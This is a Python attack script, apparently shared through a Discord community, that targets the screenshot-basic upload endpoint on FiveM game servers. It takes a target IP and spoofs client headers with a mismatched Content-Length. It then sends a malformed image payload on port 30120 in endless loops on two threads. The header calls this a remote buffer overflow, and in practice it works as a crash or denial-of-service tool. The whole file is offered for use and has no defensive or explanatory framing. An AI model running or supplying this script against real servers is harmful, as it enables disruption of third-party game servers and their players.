# Screenshot-basic remote buffer overflow
# iOnly69 - discord.gg/ltd

import time
import requests
import urllib3
import threading
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_usage():
    print("Usage: python fivem.py [IP]")
    sys.exit(1)

if len(sys.argv) != 2:
    print_usage()

ip_address = sys.argv[1]

#  headers
additional_headers = {
    "Host": f"{ip_address}:30120",
    "Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.141 CitizenFX/1.0.0.6624 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryCyeWajmfJr0fw5dp",
    "Accept": "*/*",
    "Origin": "nui://screenshot-basic",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "1"
}

# Binary image data
image_data = b'\xff\xd8\xff\xe0\x00\x10iOnly69MadeThisShit\x01'

#  POST request with data
def send_request():
    url = f"http://{ip_address}:30120/screenshot-basic/upload/f82f9343-7a19-45a2-abea-e2ba6ef60e90"
    try:
        response = requests.post(url, headers=additional_headers, data=image_data, cookies=None, verify=False)
        print(response.text)
    except Exception as err:
        print("Error:", err)

# requests loop
def request_loop():
    while True:
        send_request()

# Start multiple threads
num_threads = 2  #  number of threads 

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=request_loop)
    threads.append(thread)
    thread.start()


for thread in threads:
    thread.join()
